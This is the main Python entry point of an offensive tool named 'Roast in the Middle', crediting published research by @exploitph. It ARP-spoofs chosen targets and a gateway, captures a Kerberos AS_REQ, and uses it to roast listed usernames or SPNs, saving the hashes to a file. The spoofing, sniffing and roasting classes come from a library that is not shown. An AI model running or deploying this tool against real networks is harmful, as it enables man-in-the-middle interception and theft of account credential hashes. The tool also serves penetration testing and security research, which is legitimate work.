import typer
from typing import List
from ritm.logger import init_logger, logger, console
from ritm.lib import Spoofer, Sniffer, Roaster
from ritm import __version__

app = typer.Typer(
    add_completion=False,
    rich_markup_mode='rich',
    context_settings={'help_option_names': ['-h', '--help']},
    pretty_exceptions_show_locals=False
)


@app.command(no_args_is_help=True, help='Roast in the Middle :fire:')
def main(
    interface: str = typer.Option('eth0', '--interface', '-i', metavar='INTERFACE', help='Interface to listen on', rich_help_panel='Spoofing Options'),
    targets: List[str] = typer.Option(..., '--target', '-t', metavar='IP_ADDR', help='Target to ARP spoof (flag can be used multiple times)', rich_help_panel='Spoofing Options'),
    gateway: str = typer.Option(..., '--gateway', '-g', metavar='IP_ADDR', help='Gateway to spoof', rich_help_panel='Spoofing Options'),
    users_file: typer.FileText = typer.Option(..., '--users-file', '-u', help='File containing usernames (or SPNs) to attempt to roast', rich_help_panel='Roasting Options'),
    output_file: str = typer.Option(None, '--output-file', '-o', metavar='FILENAME', help='Output file for roasted hashes', rich_help_panel='Roasting Options'),
    dc_ip: str = typer.Option(None, '--dc-ip', '-d', metavar='IP_ADDR', help='Domain controller to roast', rich_help_panel='Roasting Options'),
    debug: bool = typer.Option(False, '--debug', help='Enable [green]DEBUG[/] output')):

    banner()

    init_logger(debug)
    users = users_file.read().splitlines()

    Spoofer._enable_ip_forwarding()

    try:
        spoofer = Spoofer(interface, targets, gateway)
        spoofer.start()
        
        sniffer = Sniffer(interface)
        while True:
            sniffer.run()
            while sniffer.as_req_packet == None:
                pass

            roaster = Roaster(users, sniffer.as_req_packet, output_file, dc_ip)
            roaster.roast()

            if roaster.as_req_is_valid and roaster.roasted > 1:
                break
            
            if not roaster.as_req_is_valid:
                logger.info('Captured AS_REQ is not valid, restarting the sniffer...')
            elif roaster.roasted <= 1:
                logger.info('No account was successfully roasted (wrong entries in the users file?)')
                break

            sniffer.as_req_packet = None
            sniffer.stop()

        logger.info('Preparing to shutdown, may take several seconds..')

    except KeyboardInterrupt:
        logger.info('Preparing to shutdown, may take several seconds...')

    finally:
        sniffer.stop()
        spoofer.stop()

        logger.info('Done!')
        

def banner():
    console.print(f'''

         [orange1 bold](                                                          *                              
         )\ )                   )                  )    )         (  `         (     (    (        
        (()/(         )      ( /(   (           ( /( ( /(    (    )\))(   (    )\ )  )\ ) )\   (   
         /(_)) (   ( /(  (   )\())  )\   (      )\()))\())  ))\  ((_)()\  )\  (()/( (()/(((_) ))\  
        ([/]_[orange1 bold]))   )\  )(_)) )\ ([/]_[orange1 bold]))/  (([/]_[orange1 bold])  )\ )  ([/]_[orange1 bold]))/((_)\  /((_) ([/]_[orange1 bold]()(([/]_[orange1 bold])(([/]_[orange1 bold])  (([/]_[orange1 bold])) (([/]_[orange1 bold]))[/]_[orange1 bold]  /((_)[/] 
        | _ \ [orange1 bold](([/]_[orange1 bold])(([/]_[orange1 bold])[/]_[orange1 bold] (([/]_[orange1 bold])[/]| |_    (_) _[orange1 bold]([/]_[orange1 bold]/([/]  | |_ | |[orange1 bold](_)([/]_[orange1 bold]))[/]   |  \/  | (_)  _| |  _| || |[orange1 bold]([/]_[orange1 bold]))[/]   
        |   // _ \/ _` |(_-<|  _|   | || ' \\\[orange1 bold]))[/] |  _|| ' \ / -_)  | |\/| | | |/ _` |/ _` || |/ -_)  
        |_|_\\\\___/\__,_|/__/ \__|   |_||_||_|   \__||_||_|\___|  |_|  |_| |_|\__,_|\__,_||_|\___|  v[blue bold]{__version__}[/]
    
                              Based on research and PoC published by @exploitph
    
    ''', highlight=False)  


if __name__ == '__main__':
    app(prog_name='ritm')
